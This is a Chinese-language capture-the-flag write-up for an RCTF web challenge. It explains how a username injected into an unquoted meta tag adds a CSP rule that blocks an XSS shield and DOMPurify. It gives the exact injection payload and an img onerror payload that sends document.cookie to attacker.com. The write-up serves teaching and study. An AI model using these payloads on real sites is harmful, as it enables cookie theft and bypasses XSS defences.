# Author

## 题目分析

### Bot 访问逻辑

Bot 设计为自动审核并拒绝文章的管理员机器人。

**Bot 的访问流程如下：**

1. 启动 Puppeteer 浏览器
2. 设置 Cookie：`flag=RCTF{test_flag}`（domain 为 blog-app）
3. 访问登录页面 `/login`，使用管理员账号密码登录
4. 通过传入的文章 ID 访问指定的文章页面 `/article/{id}`
5. 如果存在 ID 为 `audit` 的按钮，点击进入审核页面
6. 等待 CSS class 为 `btn-reject` 的按钮出现（最多等待 5 秒），如果出现则点击
7. 等待 5 秒后关闭浏览器

### 文章页面逻辑

文章页面的渲染流程分为三个阶段：

**1. 后端渲染** (`blog/views/article.php`)
   - 渲染页面框架和元信息
   - 加载 `purify.min.js`（DOMPurify）和 `xss-shield.js` 防护脚本
   - 文章内容区域初始只显示 "Loading..."

**2. XSS 防护机制** (`xss-shield.js`)
   - 阻止几乎所有危险的 DOM 操作和事件绑定
   - 限制只允许一次 `fetch` 调用和一次 `innerHTML` 设置
   - Hook `innerHTML` 属性，对所有设置的内容使用 DOMPurify 进行**两次净化处理**

**3. 文章内容加载** (`blog/public/assets/js/article.js`)
   - 通过 `fetch('/api/articles/{id}')` 获取文章内容
   - 使用 `innerHTML` 将内容插入到 `#article-content` 元素

## 突破思路

要实现 XSS 攻击，核心在于**让 `xss-shield.js` 的防护机制失效**。

如果能阻止 `xss-shield.js` 的加载或执行，那么：
- 文章内容将直接通过 `innerHTML` 插入到 DOM 中
- 不会经过 DOMPurify 的净化处理
- 恶意代码可以成功执行

## 漏洞分析

### 核心漏洞：Meta 标签属性值未加引号

在 `blog/views/layout/header.php` 第 9 行存在关键漏洞：

```php
<meta name="author" content=<?php echo $pageAuthor; ?>>
```

**问题所在**：`content` 属性值没有使用引号包裹，导致可以注入新的 HTML 属性。



### `htmlspecialchars()` 

在 `blog/views/article.php` 第 2 行：

```php
$pageAuthor = htmlspecialchars($article['username']);
```

**关键点**：

- 用户名经过 `htmlspecialchars()` 处理进行转义
- `htmlspecialchars()` 默认只转义双引号（`"`），**不转义单引号（`'`）**
- 这为我们使用单引号包裹属性值创造了条件



### 利用 CSP 绕过防护

Meta 标签有一个属性 `http-equiv`，可以用于模拟 HTTP 响应头。

当 `http-equiv="content-security-policy"` 时，允许页面定义 CSP（Content Security Policy）策略。我们可以利用这一点来阻止 `xss-shield.js` 的加载。

**关键约束条件：**

1. **需要精确控制 CSP 策略**：必须阻止 `xss-shield.js`，但允许 `article.js` 执行，否则恶意文章内容无法加载

2. **单引号限制**：由于 content 值使用单引号包裹，内部无法再使用单引号，因此无法使用 `'self'`、`'unsafe-eval'`、`'unsafe-inline'` 等关键字

3. **解决方案**：使用 `script-src-elem` 指令代替 `script-src`
   - `script-src-elem` 只控制 `<script>` 标签的外部 JS 文件加载
   - 不影响内联脚本的执行
   - 可以精确指定允许加载的 JS 文件



## 攻击链

完整的攻击流程如下：

1. **注入恶意 CSP**
   - 通过注册时设置特殊用户名，注入 CSP meta 标签
   
     **Payload：**
   
     ```
     'script-src-elem http://blog-app/assets/js/article.js ' http-equiv=content-security-policy
     ```
   
     **渲染后的 HTML：**
   
     ```html
     <meta name="author" content='script-src-elem http://blog-app/assets/js/article.js ' http-equiv=content-security-policy>
     ```
   - 限制 `script-src-elem` 仅允许 `article.js` 加载
   
2. **阻止防护脚本加载**
   - CSP 策略生效后，浏览器只允许加载 `article.js`，阻止其他所有外部 JS（包括 `xss-shield.js` 和 `purify.min.js`）
   - 防护机制完全失效
   - 内联脚本不受影响，可以正常执行
   
4. **触发 XSS 攻击**
   - 文章内容中的恶意脚本被执行
   - 窃取 Bot 的 Cookie（包含 flag）



## 利用步骤

### 步骤 1：注册恶意用户

注册账号时，将用户名设置为：

```
'script-src-elem http://blog-app/assets/js/article.js ' http-equiv=content-security-policy
```

### 步骤 2：创建恶意文章

发布文章，内容包含 XSS payload：

```html
<img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)">
```



### 步骤 3：提交 Bot 访问

将恶意文章的 ID 提交给 Bot，触发以下流程：

1. **页面加载** - Bot 访问文章页面
2. **CSP 生效** - 注入的 CSP meta 标签立即生效
3. **防护失效** - `xss-shield.js` 被 CSP 阻止，无法加载
4. **内容加载** - `article.js` 正常执行，获取并渲染文章内容
5. **XSS 触发** - 恶意代码执行，窃取 Bot 的 Cookie
6. **获取 Flag** - 从外带的数据中提取 flag

